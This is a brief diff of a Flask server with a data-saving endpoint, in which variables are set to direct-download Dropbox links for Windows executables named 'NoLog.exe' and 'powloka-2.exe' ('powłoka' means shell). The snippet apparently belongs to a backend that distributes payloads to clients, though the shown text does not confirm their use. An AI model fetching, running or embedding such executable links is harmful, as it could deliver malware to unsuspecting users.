@@ -5,7 +5,7 @@ app = Flask(__name__)
 CORS(app)
 
 last_data = None
-last_data_2 = None
+last_data_2 = "https://www.dropbox.com/scl/fi/oje2pedfzgjbcte8qwe4l/NoLog.exe?rlkey=gqtgo6c5zo2vcztddjrj1uze5&st=1wd517gj&dl=1"
 last_data_3 = "https://www.dropbox.com/scl/fi/domzcncpylxnbocw6gppk/powloka-2.exe?rlkey=ze4pqrjn33e4828a2ernqzbd5&st=z2hy978v&dl=1"
 
 @app.route('/save_data', methods=['POST'])
